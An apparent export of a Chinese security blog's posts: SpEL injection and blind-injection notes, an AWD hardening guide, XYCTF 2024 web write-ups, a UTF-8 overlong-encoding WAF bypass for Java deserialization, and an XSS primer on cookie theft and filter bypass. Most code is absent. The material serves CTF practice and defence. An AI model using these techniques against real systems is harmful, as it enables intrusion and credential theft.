?:(Elvis) 正则表达式 matches 这里的条件运算不能用if else，只能用三目运算符貌似 算数运算 字符串拼接： ^执行幂运算 关系运算 这里需要注意的是，在xml配置中，如果直接写&gt;=、&lt;= 等会直接报错，这是因为在xml中&gt;和&lt;都有特殊含义，所以为了实际的使用，spel提供了几个等效替代的符号： 运算符 符号 文本类型 等于 == eq 小于 &lt; lt 小于等于 &lt;= le 大于 &gt; gt 大于等于 &gt;= ge 例如： 判断total是否小于等于100： 当然，==也是可以直接使用的，如判断total是否等于100： 这里返回的都是Boolean类型的结果 逻辑运算 只需记得逻辑运算符都使用了他们的英文来替代即可： 例如&amp;&amp;(也就是and)： 两边为true的时候才会返回true 不过也有例外，not运算也可以用!替代： 条件运算 三目运算符 这里的意思是是如果选择的歌曲是May Rain的话，选择一个id为piano的bean，否则选择一个id为saxphone的bean(因为这里没有使用单引号，所以是bean) 判断是否为空： 如果kenny.song非空就选择kenny.song，否则选择Jingle Bells作为歌曲 为了方便，此时可以利用spel的三目运算符的变体来简化表达式： 这里如果kenny.song不为null，则结果选择kenny.song 正则运算 利用match，例如： 集合运算 spel表达式还能够对集合进行操作： 例如下面的例子 修改beans.xml，此时能够配置一个包含city对象的List集合： 创建好之后可以通过#&#123;集合ID[i]&#125;的方式来访问成员 例如某choseCity类，通过挑选city集合内的一个对象来输出city 通过beans.xml来选取集合中的某个成员，并赋值给city属性： 实例化bean： 会输出Chicago 中括号内支持函数： 此时会输出cities集合内的随机一个对象 同样地，也可以将其存入map，此时[]内可以放key，通过key来获取到value： []还可以在Properties集合中取值，假设通过&lt;util:properties&gt;在spring中加载一个properties配置文件： 访问settings内的一个token： []还可以返回字符串的某个字符： 查询集合成员 .?[]：返回所有符合条件的集合成员 .^[]：返回第一个符合条件的集合成员 .$[]：返回最后一个符合条件得到集合成员 例如choseCity修改为了一个list类型，直接返回所有的list beans.xml添加了一个筛选的bean： 主程序： 此时通过chosecity的bean的筛选，会输出population&gt;=100000的所有结果 变量定义和引用 利用setVariable设置变量： 引用则需要使用#variable来引用 同样地，有根对象和正在计算的上下文 输出 instanceof 支持instanceof 自定义函数 例如某函数func()，需要注册到Context里： spel表达式漏洞 这就得提到前面的一个接口：EvaluationContext了，这个接口有两个EvaluationContext SimpleEvaluationContext StandardEvaluationContext Simple版的只支持spel语言语法的一个子集，不包括java类型引用、构造函数和bean 而Standard版本的是支持全部spel语法的 由于spel是支持操作类和方法的，可以通过T(type)来调用任意类方法，这是因为不指定EvaluationContext的情况下默认使用的是Standard版本的EvalutaionContext，在允许用户控制输入的情况下可以造成任意命令执行 弹计算器的poc： poc 以parseExpression为主，所以会把界定符#&#123;&#125;去掉： spel盲注 还记得前面的readAllBytes吗，他返回的是一个bytes数组，那是不是说只要通过下标就能够返回对应的数组了呢？ 基于布尔型的spel盲注读文件： 利用返回的响应码+三目运算符，还记得吗，如果不加引号，返回的字母就是取bean的属性： 这里kenny.song没有加引号，说明取得是对象的属性，如果环境里没有属性，就会报500 根据这个条件可以判断盲注 同时可以支持二分法(lt和小于号可以互用): payload： 这里的resp500和resp200是模拟响应码，实际上只需要这样： 即可，因为a没有加引号，且肯定不存在这个对象，故直接返回500 绕一下关键词的话： 这样就能够构造一个二分脚本： 基于时间 利用T(Thread).sleep(1000)，大概是一秒钟 payload改成 脚本就不写了，拿sql盲注的改下就好 🤔，总之看哪个顺眼用哪个，反正优先选择能够打反弹shell的 生成byte数组的脚本 绕过T()的办法： 绕过getClass的过滤 这里的数组下标可能要被修改，因为不同jdk下标不一定是一样的 检测与防御 检测只需要找关键特征即可： 比如关键类org.springframework.expression.Expression org.springframework.expression.ExpressionParser org.springframework.expression.spel.standard.SpelExpressionParser 或者代码里的expression.getValue() 防御也很简单，前面说过spel有两个Context，一个simple，一个standard。standard版的支持所有语法，而simple的只支持一些语法，将EvaluationContext换成SimpleEvaluationContext即可： "},{"title":"被awd速通(1)","date":"2024-04-28T12:34:41.000Z","url":"/posts/57335.html","tags":[["awd","/tags/awd/"]],"categories":[["undefined",""]],"content":"心血来潮学习awd(吗？) awd常见于线下赛，刚开始每个队都会有相同的初始环境。这些环境运行着一些特定的服务和应用，需要利用这些漏洞，获取flag以获得积分，同时也需要修补自身漏洞进行防御，以防被交flag导致丢分 流程 准备：多个靶机服务器，有ssh或vnc的用户名或者密码，以及相关的ip信息 加固：自行登录服务器并进行安全加固。需要进行以下流程 备份源码 改密码(包括但不限于ssh密码、mysql密码、windows等密码) 代审(d盾？)，找明显的洞 针对洞进行修复 攻击，通过对别的靶机服务进行攻击获取得分 比赛靶机情况 运维机Windows 10 + 攻击机kali linux + win靶机(Winserver 2003/2008/2012)或者win7 + linux靶机Centos7.x / Ubuntu 16.04/17.01/20.04 运维机Windows10 + 攻击机kali linux + linux靶机 运维机 + 攻击机 + 纯windows靶机 也就是说比赛会有数台机子，可能windows，也有可能是linux，这些机子上面的web服务等地方都有漏洞，要先抓紧时间修复，再通过找到的漏洞去攻击别的队伍的服务器拿到flag从而得分 修复流程 备份源码 web源码备份： windows机的话，建议直接打包 web服务路径： 打包： 解压缩 备份： 上传和下载源码： mysql数据库备份 检查mysqldump是否在/usr/sbin等其他目录下 如果靶机没有需要提前准备编译好的工具： 备份所有数据库 导入数据库 source导入mysql方法： 前提：需要创建好数据库，且该数据库必须与你的备份文件中的库名一样 备份运行进程命令： 改密码 ssh: 一些后台密码可能默认会存在于一些类似于admin.php，login.php当中，还有可能存在于db.sql等数据库当中，记得修改密码 改mysql密码： redis： windows加固 查看信息 加固445端口、防火墙3389服务： 开启系统日志审计功能 禁用guest账户、关闭文件共享 确保启动项内容是可控的 限制3389远程访问控制的连接数：在本地组策略编辑器里面，依次展开计算机配置–&gt;管理模板–&gt;Windows组件–&gt;远程桌面服务–&gt;远程桌面会话主机–&gt;连接–&gt;限制连接的数量 使用工具监控关键目录文件:文件操作监控.exe、御剑文件监控.exe 恶意代码文件，通过PCHunter、Monitor查找 Web目录环境查找相关可疑文件：jpg/png/rar，查看属性、解压看文件内容 NTFS扫描磁盘查找隐藏的交换流数据 查找系统所有账户信息，禁止非Administrator账户 查看端口： RDP： 删除默认帐户并手动添加新用户： 步骤1：按 Win + R 打开运行对话框，输入 secpol.msc 并单击 “确定” 步骤2：导航至此处：本地策略–&gt;用户权限分配，再双击打开 “允许通过远程桌面服务登录” 步骤3：删除此窗口中列出的管理员和远程桌面用户（或计算机上的任何其他用户或组） 步骤4：之后单击 “添加用户或组” 并手动添加您要授予远程桌面访问权限的用户 更改默认RDP端口号： 步骤1：打开运行对话框，输入 regedit 并单击 “确定” 步骤2：打开 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp ，向下滚动并找到 PortNumber 然后双击它 步骤3：选择 “十进制”，修改为您想要设置的端口号，然后单击 “确定” linux加固 查看端口： SSH安全加固： 限制ip登录 禁用root远程登录(同上配置)： 按用户和组限制SSH登录 重启SSH服务 信息收集 寻找配置文件 如果是java，将jar包解压之后看一下BOOT-INF/lib下的依赖，是否有shiro等依赖，若有，再检查ShiroConfig.class或者类似的地方是否有存在shiro的默认密钥 寻找flag 禁ping： 应急响应 杀进程： 搜webshell： 不死马： 高权限下，可以直接重启服务： 但是基本上比赛的时候不会放出高权限的账户，得在低权限下进行处理： del.php 访问后再删除不死马 也可以先利用ps命令查看进程的pid 或者我们也可以用ps -aux命令来查看每个用户执行的命令和运行的进程 然后： 方法2：创建一个和不死马同名的文件夹 运行时： 方法3：竞争写入无意义的一句话： 查杀弹shell 检查是否有/bin/sh或者/bin/bash 很有可能是nc 变种不死马： 文件名： 删除只需要添加 web服务加固 php sql注入 预编译 最佳的解决方式，预编译，但是不能防order by(业务需要，导致这个参数如果被预编译了就无法执行语句了) 对于预编译就上白名单即可 addslashes、mysqli_real_escape_string 其中mysqli_real_escape_string还能够防止宽字节注入 php 5.4以下，禁用魔术引号(自动对外部来源数据进行转义，防止sql注入) waf启动： 记得关闭报错信息 xss httponly htmlspecialchars()转义函数： htmlspecialchars()能够将预定义的字符转换为html实体 前端js修复： xxe 文件上传 后端代码限制上传的文件类型和后缀大小： 检查文件后缀： php、php5、php4、php3、php2、phtml、pht、.htaccess、.user.ini 检查文件内容： 配置.htaccess： 强制给上传的文件添加后缀名，在不存在文件包含漏洞的情况下，该方法能最有效的防御攻击者上传执行木马 ssrf ssrf的修复方法如下： 去除url中的特殊字符 判断是否属于内网ip 将请求时的域名改为ip 请求的url就变成了上面返回的url 请求的时候设置header里的host为ip 请求头，判断是否为30x的跳转 第一步为了防止url parse造成的解析问题 第三步防止dns重定向 第五步防止ip请求的时候某些网站无法访问 最后一步防止通过跳转进行绕过 非必要不要从用户那里接受要访问的url，防止用户构造url进行穿透访问 修复： 利用open_basedir open_basedir限制用户的访问目录，可以有效防止file_get_contents、curl、fopen等函数对服务器的敏感文件的访问 上白名单： python： rce 一些命令执行函数： 修复方式： waf: 修补preg_replace的时候需要将修饰符/e去掉 php7下，preg_replace不再适用\\e，而应当使用preg_replace_callback() php.ini中设置disable_function 反序列化 php7，为unserialize()函数提供了过滤，这个特性可以提供更加安全的过滤方式 限制session反序列化 php_serialize 在5.5版本后新加的一种规则，5.4及之前版本，如果设置成php_serialize会报错。 限制phar： php.ini设置禁用函数： 文件包含 小waf： 大waf(协议过滤+路径 访问控制)： php.ini open_basedir java sql注入 MyBatis框架： 将$改为# 但是遇到了像是这种除了带有单引号，还有特殊字符，如%的要特殊处理 修复方式要加concat： 其实原理就像是预编译（ dao 和 Hibernate DAO的漏洞代码跟mysql是类似的： 也是直接进行一个拼接 Hibernate： 修复方式 预编译启动(使用java.sql.PreparedStatement)： 同理，预编译并不能防御order by导致的注入 java-ssrf java的ssrf局限性比较大，能够发出网络请求的几个类： HttpClient apache的httpClient组件： Request(对HttpClient的封装) HttpURLConnection 关键代码如下，这里通过url参数接受用户的输入，然后直接openConnection打开连接： URL类 OKhttp 简单修复代码： 白+黑+禁止访问内网ip 推荐： 禁内网ip+白名单业务： 限制协议为http或者https： 🤔，还是有点缺陷的，没有禁用100.x.x.x(企业级网关段) fastjson 改高版本？ 直接开启safemode: 改完java后重新打包然后重启服务，pom.xml java反序列化 白名单防御： SerialObject是一个class数组，白名单 黑名单防御： 重写resolveClass，例如创建一个MyObjectInputStream，里面限制黑名单： 完整代码如下，黑名单根据需要再添加： 然后在漏洞处修改利用我们自己写的ObjectInputStream blacklist： 直接从fastjson一致限制的黑名单denyList内copy： GitHub - LeadroyaL/fastjson-blacklist jspshell 啊？ d盾启动 找到就删了 不死马怎么办 我不会啊T_T 找进程吧 内存马  文件读取 File + FileInputStream/getPath/getAbsolutePath/ServletFileUpload 例如： 简单waf： 只能够简单的防御，特定情况下还能够bypass 文件写 简单防御： rce 对传参点进行过滤： log4j2 分不同版本： 2.10及以上 在应用程序的classpath下添加log4j2.component.properties配置文件： 系统环境变量： 1.x 对于log4j 1.x版本，移除JMSAppender.class文件，命令为：zip -q -d log4j-1.x.jar org/apache/log4j/net/JMSAppender.class 注意测试，防止对业务产生影响 2.x 移除JndiLookup类的方式 永久修复： 升级到最高版本log4-2.15.1-rc1 并弃用log4j 1.x版本 awd_java_web_patch GitHub - Jlan45/AWDJavaWebPatch: 通过jar包快速生成patch模版 个人推荐的用法是不进行jar包或war包的打包，而是通过本项目生成好IDEA项目之后只进行1、2、3步骤的配置，然后通过压缩软件对编译好的class文件直接进行替换，目前测试Bandizip可以保证替换前后jar包和war包的可用性 有部分的jar包war包反编译的class是经过编译器优化的，这也导致反编译后生成的Java文件会有奇怪的语法错误，这时候对症下药即可，也可以直接删除所有java文件只保留你需要进行patch的 最后祝各位师傅在AWD赛场上玩的愉快，不被环境困扰 文件监控 查最近十分钟被修改的文件 "},{"title":"XYCTF2024 Web方向题解","date":"2024-04-26T14:00:14.000Z","url":"/posts/52072.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"仅作wp记录用，不宣泄任何情绪，仅作知识分享 牢牢记住，逝者为大 想你了牢大 题目源码如下： 可以看到这里好多限制： 长度限制小于等于13 命令执行的几个函数都被过滤了 对于val，也就是我们传入的值进行了限制，不能够是上面的bin|mv|cp|ls|\\||f|a|l|\\?|\\*|\\&gt;/ eval前后都有脏数据 这里其实过滤倒是其次，这边要考虑的更重要的是两个方面：长度限制和脏数据 我这边的思路经历了以下的流程： 数组绕过strlen 但是发现不太行，因为我们知道字符串拼接之后数组会直接变成Array： 所以肯定是不行的，只能够老老实实用13个字符限制做这个题 执行命令 这里我先把Kobe的限制去掉了，变成： 这样先测试命令执行 可以看到eval里面前面是一个#，也就是一个注释符，它能够将后面的内容都注释掉。 所以我们就算写好了cmd也没用，只能够注释掉 但是#和//是一样的，都是单行注释符，所以我们只需要换行即可，加个%0a就可以绕过前面的限制 后半段呢，我打算是用__HALT_COMPILER();直接终止编译成字符串的，乍看之下它可行，但是实际上这个函数本身就已经超过了13个字符的限制，更不要谈getshell 在这里我就卡住了一会，因为这个HALT_COMPILER我的印象比较深刻 然后我想着想着突然茅塞顿开，前面的#注释能不能能用到后面去呢？ 然后我就测试了一下： 当然这个#要用urlencode成%23 答案是可以的： 本地测试dir有结果 所以前后都确定了： 接下来就是在11个字符的限制下打一个shell 想起p神的最短webshell： 你猜怎么着，刚好11个长度 payload那就呼之欲出了 回到题目，还对&gt;做出了限制 所以我这里打算打一个反弹shell，刚刚好题目是出网的： warm up 第一层就是简单的md5 用下面这个链接全秒了： 反序列化-md5和sha1绕过_md5反序列化-CSDN博客 弱等不想想，直接用数组： 下面双md5，在上面的文章随便挑一个就行了 最后这个，我们要先看看这个XYCTF_550102591 md5之后是什么东西 其实还是个0e开头的md5，那就简单了 利用extract将XYCTF覆盖成和XY一致的变量： 到达第二关： LLeeevvveeelll222.php preg_match，用数组绕： 下面这个preg_replace有点特别，估计是利用\\e来执行命令 抄一下： 出了： Make File 直接命令执行 ezmd5 两张图片如下： cryptanalysis - Are there two known strings which have the same MD5 hash value? - Cryptography Stack Exchange ezhttp 登录框，f12找到提示藏在某个地方 其实这个时候可以dirsearch开搜 但是这边可以猜一猜，猜到了robots.txt: 访问这个txt 然后拿hackbar操一下： ezpop 看到有个throw Exception就可以想到利用gc回收机制来绕过 链子终点BBB-&gt;__get 通过AAA-&gt;__toString访问BBB类的$p来进入BBB 通过CCC-&gt;destruct进入toString 链子： 但是这里要简单的测一下中间这个： 弄出来是个什么东西 这里出了个套娃，简单地看一下 其实就是相当于用call_user_func调用函数A，通过A(c)调用函数B，然后B(c)调用函数B，然后B(c)调用函数B，然后B(d)实现rce 那么要怎么挑选呢？ 首先可以根据$b是一个数组可以确定$a是一个获取到数组的键或者值的函数，无参rce里的几个函数可以利用得到 我这边就挑选了array_rand，不过他是随机的，但是数组长度只有1，所以array_rand就是确定的 通过array_rand能够获取到键名，而且它的键名是一个函数名，我这边选了hex2bin 利用hex2bin来调用system： 利用system获取到flag即可，exp如下： ez?make 反引号命令执行反弹shell： 可以看到源码过滤了这些 我是一个复读机 其实这个题一句话就可以带过： 弱密码爆破+requests.values.xx传参绕ssti 弱密码选了个asdqwe，用fuzzdict-master可以爆的出来(某集团常用弱口令字典) 输入框输入中文以后出的大括号才是ssti用的大括号 🤔，总之就是中文这块比较难想。还是队友帮忙测出来的 找一下os_warp_close: payload很简单： 加两个中文就有两个大括号，ssti 用admin asdqwe登录即可，ssti完了简单扒个源码 ezSerialize 第一层： 来到/fpclosefpclosefpcloseffflllaaaggg.php(第二层) 终点类： C::__call 链子： 不知道为什么打不上去 绕wakeup的，版本估计是7.3了，，： 不绕的： 你妈的，为什么打不了 我操，原来要把name置成null： 第三层，链子自己看吧，主要利用到一个stdClass()，可以看一下这位师傅的博客php反序列化小记(1)，没什么好说的，链子都是能看得出来的，具体原理大概是如果题目当中没有能够反序列化获取属性的对象，那么可以用stdClass类，这是一个php的内置类： exp: 连连看到底是连连什么看 源码大概如下，记不清了： 原理都在_rev1ve神的博客文章上有 因为base64只能接受[A-Za-z0-9+/=]，所以其他的不可见字符一旦进入到decode流程就会被忽略 所以很简单，套就是了，一直decode直至只剩下XYCTF 找到一个php_filter_chain_generator.py，挺高级的利用了，它支持任意的payload写入： exp: 反正多套几层base64肯定能出，实在不行就从XYCTF一步步套上去 ezrce 原理和CTFShow极限rce一致，探姬师傅有个脚本，一把梭了… 并不（ 记得加bash的符号就可以了 payload： 去base64解码 pharme 测试可得允许上传的后缀为jpg class.php是一个简单的无参RCE，利用__HALT_COMPILER();终止编译即可 exp： 要绕过phar头，用下面的脚本： 触发phar： 我好像用的是第一个触发的 先传ezxyy2.jpg检测请求头，找到数组的最后一个元素 然后再传ezxyy.jpg打rce ezClass 水题 利用php的Error类带出信息即可： εZ?¿м@Kε¿? 打开f12发现了hint.php，发现匹配规则如下： 这个正则的意思是匹配除了中括号以内的字符 也就是白名单只有这些符号 而且测试发现payload长度&lt;8 也就是最多只能够用7的长度来执行 其实这里可以爆破() 生成一个11^7+11^6+11^5+11^4+11^3+11^2+11的字典即可(( 然后本地测试() 测试发现：makefile里的$&lt;就是/flag，但是没有直接读取的权限 这里结合一下linux的东西 $()也能够执行命令，&lt;能够将东西输入到命令里，直接读取不行就用这样的方式读取： 将/flag重新定向到一个bash -i里 外部相当于bash -c 其实就相当于bash -c &quot;bash -i /flag&quot; 替换一下/flag就是$&lt; payload： login 如果注意到这个题有个register.php的话就能够解决了 但是wsrx这个不给扫= = /register.php注册一个账号，然后登录，发现啥也没有 下意识打开F12，发现了cookie这里有个Rememberme 下意识以为是shiro，然后高高兴兴地去拿shiro的工具打，发现根本不行 man! 然后才仔细看看它的cookie： 一坨AAAA，其实这里是pick的特征 看看base64 能直接解码显然不对劲了，还有一个app 这里很明显是python的服务器，那这个cookie经过base64decode的是啥呢？ 搜一下就知道 百度：ctf RememberMe 发现是pickle的特征，这下就合理多了 那简单，打pick反序列化就对了，发现还有waf的，直接打不太行 发现过滤的是关键字，比如import，system等 但是os没有被过滤，这个时候直接用os.popen就好了： 反弹shell，源码如下： give me flag 哈希长度拓展攻击。 讲下原理吧。 md5的算法流程 对于一个字符串，其二进制长度=字符串长度*2*4 比如对于64个a，其二进制长度就会是64*2*4=512 对于MD5算法来说，要对原数据进行分块处理，以512个二进制数据为一块，直到最后的数据块，分为以下两种情况： 长度&lt;=448时，则会填充padding(无意义数据)使其长度达到448，再添加原始明文数据的二进制长度信息直到512位 长度&gt;448且&lt;512时，填充padding到下一块的448位，再添加二进制长度信息至512位 将数据分块后就可以进行md5运算了 初始向量是确定的： 经过运算即可获得MD5值 而这个运算，对于一个确定的md5，可以通过一定的规则将md5转成secret+xxx的md5值 具体的过程可以看这篇文章：浅谈HASH长度拓展攻击 - Yunen的博客 - 博客园 (cnblogs.com)，膜拜师傅Orz 哈希长度拓展攻击一般都推荐hashpump 但是我觉得hexpand更加好用： hexpand安装 这个43怎么来的呢？因为web的动态flag格式是： 找个其他靶机看看flag格式也行，前缀flagname是XYCTF，uuid.uuid4()的长度是36，加起来就是43了 由于这里题目给的是$flag.$value.$time，其中$time=time()，我们需要对时间戳进行预测提交，又由于提交时靶机有延迟，所以这里要测以下请求的时间差 $value.$time是我们要追加的信息，但是$time已经写好了，所以我们生成的md5时追加的信息要删掉 经过我测试大概提交时间和实际时间有三秒钟左右的延迟(计算两次请求的时间差)，写出python脚本如下： ezLFI 源码： filterchain秒杀： Baby_Unserialize(赛后复现) 这里真的测了很久… 黑盒java，出网，urldns链能打 想用cc链，但是根本打不得一点，直接返回HOW DARE YOU 这就难办了，也不知道后台有啥gadget，只能盲测一波。这里想到了[用urldns链探测gadget][] 🤔，改一下测gadget： 。。。。。。。。 还有很多，就不放出来了 逆天，啥gadget都没 这里就在想它到底是怎么过滤的了。 测得关键字commons.collections被干掉了，🤔 这里还在想他是不是用serialkiller或者是其他的方式，比如常见的resolveClass给ban掉了，然后用一种很新的day给绕过 百思不得其解，只能去找找绕waf的方式 找是找到了，回忆飘如雪师傅的两个方式： 加大量脏数据 延时分块传输 都没解，这么为难我一个小萌新干啥捏。。 遂放弃。 但其实是自己想太多了。。 还有一种可能就是只检测了解码后的String是否含有commons.collections，毕竟如果直接重写resolveClass就是无解的命题 只需要绕commons.collections即可： cc6： 工具类： payload url编码一下打过去就可以了 shell弹过来了，flag is in env "},{"title":"UTF8 Overlong Encoding绕waf","date":"2024-04-26T10:27:30.000Z","url":"/posts/13739.html","tags":[["java","/tags/java/"]],"categories":[["java","/categories/java/"]],"content":"学习一个绕waf的方法 🤔，这种方法应该只适用于contains? 反正能用的地方目前还真没找到过多少 什么是UTF-8 UTF8可以利用1-4个字节表示一个符号，根据不同的符号变化字节和长度（1字节有8位，这是常识） 编码规则： 对于单字节符号而言，字节的第一位一般设为0，后面7位为这个符号的unicode编码，因此对于英文字母，UTF-8编码与ASCII编码相同，如下图： 对于多字节符号而言，假设为n字节(n&gt;1)，第一个字节的前n位都设置为1，第n+1位设置为0，后面字节的前两位统一设置为10，剩下的二进制位全为这个符号的unicode码。比如一个二位的UTF-8编码如下： 再比如一个3位的utf8编码和4位的： 举例：欧元符号€的unicode编码为U+20AC 因为U+20AC在U+0080和U+07FF之间，所以其为3字节符号： 将U+20AC转为二进制： 补全即可： 转成UTF-8就是： 如果要将低字节转换为高字节的话，需要对unicode编码进行位的拓展(计算机系统应该学过，拓展位数高位补0即可) 借助python脚本可以输出一个字母对应的二字节utf编码： 可以得出o的二字节utf-8为\\xc1\\xaf 手推的话就是：o的unicode为\\u006f 绕waf 铺垫了这么多，那这种方法究竟是怎么能绕过waf的呢 一个例子： 依赖只有commons-collections依赖，也就是强制使用cc链的操作 但是检测到commons.collections就会返回hacker,我们的payload解密后一定会有这个类名，这个时候要怎么办呢？ 先看一个简单的例子吧： 有一个弹计算机的恶意类： 后端检测： 先看反序列化的时候如何拿到classname的，调用栈： 最后到达ObjectInputStream的readUTFSpan方法： 可以看到注释里有对不同字节的处理方式(详见注释 1byte format、2 byte format、 3 byte format) 假设检测到o，o的十六进制是0x6f，很明显是一个单字节，会进入到case 7的 1 byte format处理方式 但是我们只能够从1 byte format获取到吗？ no，根据上面的case，我们可以看到case13、case14都有2 byte，3byte的处理方式 只需要将0x6f改为0xc1af再反序列化这段数据即可，但是要注意反序列化的className改变后，对应的长度也得改变 也就是要重新生成一遍byte数组，比如你获取到字节码的十六进制数据为：ACED00...C1AF....，就重新生成一遍： 工具类Hex2Byte和Byte2Hex payload如下： 有趣的是，前面的1163要改成1263(11+1)，🤔 这样就绕过了，🤔 写工具类 可以看到自己手改字节码很麻烦，还得瞻前顾后，改前面的字节，改后面的字节 由此想可以不可以写一个工具类帮自己改呢？ 可以参考师傅的文章java原生反序列化OverlongEncoding分析及实战 调用栈： 可以改readNonProxy，但是比较困难，此时发现可以通过改writeClassDescriptor的writeNonProxy方法来实现 自己重写一个ObjectOutputStream重写writeClassDescriptor方法，实现将类名Overlong Encoding的逻辑即可 这里直接贴了，Orz： 实战： payload： 直接用这个outputstream序列化即可 又学到了新姿势Orz，waf的绕过姿势又多了一种(延时分块传输、大量脏数据绕过) 参考文章： [UTF-8 Overlong Encoding · zIxyd’s Blog]( Overlong Encoding/) java原生反序列化OverlongEncoding分析及实战 - 先知社区 (aliyun.com) 师傅们tql Orz"},{"title":"xss学习","date":"2024-04-18T02:54:57.000Z","url":"/posts/20141.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"再不学xss就要被学弟狠狠超了:( xss是代码注入的一种，它允许攻击者将恶意代码注入到前端页面上 然后其他用户在浏览网页的时候就会受到影响 本质就是攻击者在web端插入了恶意的script代码(可能是css、js脚本或者是其他)，当受害者访问这种页面的时候，就会执行其中的恶意代码，获取到用户的session、token、cookies等 xss的危害： 盗取身份信息，窃取会话Cookie从而窃取网站用户隐私、包括账户、浏览历史、IP等 未授权操作，通过JS发起敏感操作请求 按键记录和钓鱼 更广泛的蠕虫传播，借助网站进行传播，使网站的使用用户受到攻击。 劫持用户会话，从而知悉任意操作，比如弹窗跳转、篡改页面、网页挂马。 这个敏感操作包括但不限于修改密码、创建工单等 XSS的分类 xss有三种分类： 反射型xss 存储型xss DOM型xss 反射型和DOM型是非持久型xss攻击，而存储型是持久型xss攻击 反射型xss payload不会存储到数据库中，一般会出现在查询页面 输入内容直接返回的参数都可能存在xss 攻击对于受害者而言是一次性的 攻击者会诱导受害者点击恶意url，点击之后由于url包含了恶意js脚本，这些脚本就会直接在受害者的主机上的浏览器执行 恶意代码并没有保存在网站，而web端也只是将这个js脚本反射回受害者的浏览器并执行了相应的脚本 流程： 攻击者准备好恶意url(有payload)，发送给用户 用户点击链接 web服务将xss代码返回给用户 客户端执行xss代码，将信息发送到了攻击者的服务中 攻击者就可以读取用户的信息 一图流： 存储型xss 将payload放在了数据库里，一般出现在会将数据存储到数据库并展示在前端页面的功能 如注册页，留言板等功能 存储型xss先将payload存储在数据库中，然后当下一次数据库从中取出数据直接将其展示在前端的时候，页面将会执行xss攻击用户 存储型xss的危害会更大，因为他将恶意代码上传或者存储到了服务器当中，只要是个访问了包含这段恶意代码的页面的用户就可能会被xss攻击 攻击流程： 攻击者向web服务插入xss payload 然后web服务会将其存储到数据库 用户访问web服务 web服务会将数据库中的数据以及视图返回给前端，前端渲染并加载。其中包含有xss payload 此时xss代码被加载，客户端执行xss代码并向攻击者服务器发送敏感信息 攻击者读取受害者的敏感信息 DOM型xss 不与后端交互、payload不存到数据库中，属于反射型的一种 但是他是通过dom操作来产生问题 发掘较困难 DOM叫Document Object Model 能够使程序和脚本动态访问和更新文档的内容、结构、样式 客户端的脚本可以动态地检查和修改页面内容，无需依赖服务端。客户端从url中提取数据并在本地执行 如果用户在客户端输入的数据包含了恶意js脚本，并且没有被过滤的话，就会导致DOM型xss 和反射型xss不同的是，dom型无需向web服务发送请求，而是直接在浏览器执行。需要注意用户的输入源：document.URL、location.hash、location.search、document.referrer等 攻击流程： 攻击者发送恶意url 用户点击恶意链接，打开浏览器 直接在浏览器客户端执行xss 此时将xss的结果发送给攻击者的恶意服务 攻击者访问xss平台，获取敏感信息 xss的区别： 反射型 存储型 DOM型 攻击对象 需要攻击者主动寻找受害者并诱导其访问 广撒网，只要有用户访问对应的页面就会触发，危害性更大，范围更广 需要攻击者主动寻找受害者并诱导其访问（同反射型） 持久性 一次性 只要服务器不宕机，payload不被手动删除，就一直存在 一次性 触发点 网站中直接返回参数内容的功能点 网站中将数据直接存储到数据库中，后直接返回数据在前端展示的功能点 取决于DOM节点 反射型xss中，返回的html包含了恶意payload 而DOM型没有包含恶意payload xss与csrf xss: 主要加载js代码，在客户端执行 不一定要经过后端，主要需要客户端执行xss代码 DOM型xss只对浏览器客户端发起攻击 xss是针对用户的攻击 csrf: 欺骗服务器，虽然由用户发起，但服务器无法判断是否是用户想要发起的请求 一定会经过后端处理，否则无法执行 csrf用于伪造身份，实行对服务器的欺骗 挖掘xss 一般可以通过输入一些常见的标签，例如h1，img等进行确认 直接返回输入内容的可能存在反射型xss 在页面中进行特定渲染的可能存在DOM型 存储到数据库的可能存在存储型xss 有时候可以将返回页面的关键词进行一些拼接： 例如上面这个就可以构造mgErrorLen=&lt;h1&gt;123&lt;/h1&gt;&amp;ie=&lt;h1&gt;123&lt;/h1&gt; 可以构造一个xss的fuzz字典（ 白盒的时候 看一下接受信息的方式$_GET、$_POST、$_REQUEST等，检查这些方式接受的信息有没有输出到页面中，输出到页面中的数据是否进行了过滤和html编码处理 搜索类似echo等输出语句，然后追踪输出变量的来源等。根据来源检查是否可控。存到数据库的时候有没有过滤等 大多数程序会对接收到的参数封装在公共文件的函数中统一调用 搜索一些js操作dom元素的关键词进行审计 (dom型其实就是利用js脚本的xss，比如某个function里面一个拼接操作，你只需要闭合一下前面的再添加自己的xss) 常见xss业务场景 评论区、留言区、个人订单、信息反馈等 这些是重灾区 站内私信、意见反馈等 这些是针对型 搜索框、头像链接、图片属性、目录这些可能回存在问题 常见payload Cross-Site Scripting (XSS) Cheat Sheet - 2024 Edition | Web Security Academy (portswigger.net) 一个速查表 fuzz字符： 基础payload 挑几个比较常见的： 总之就是src或者onload() 一些基于事件的跳转： 一些事件，比如onclick，onerror可以使用 一些伪协议： 如果url跳转的地址可控，且存在于&lt;a&gt;标签中，可以利用伪协议进行xss 对，xss中也有伪协议 markdown xss xml xss 获取cookie： 一些登录劫持手法 适用于某些登录页面存在xss，通过特殊js代码获取到账号密码。 可以将其改成跳转 修改action： 按钮属性添加： url跳转： 通过post请求获取： xhr ajax： XSS Bypass 常规手法： 编码 注释 大小写 双写 参数污染 超长垃圾数据 编码 xssor： 一个编码网站 利用这个xssor编码后用在on事件之后，也可以用在eval当中： html实体编码：&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x29; 进制：\\x61\\x6c\\x65\\x72\\x74\\x60\\x78\\x73\\x73\\x60 unicode：\\u0061\\u006c\\u0065\\u0072\\u0074\\u0060\\u4e2d\\u6587\\u4e5f\\u53ef\\u4ee5\\u0060 转义：就是单纯的：\\'、\\&lt;、\\&gt; 其他编码： jsfuck： jjencode：jjencode - Encode any JavaScript program using only symbols (utf-8.jp) eval函数 绕过&lt;过滤 可能可以通过一些特殊编码绕过： fuzz： 关键词 这个是%09还是空格，都可以试试 空格 /**/内联注释 还有一个/也可以替代空格： 一些url编码 绕javascript伪协议 \\r \\n \\t 绕括号 利用反引号 绕长度限制 location.hash.substr(1) 用户如果带上#xxxxx来访问包含有这个恶意脚本的界面，就会执行xxxxx的内容 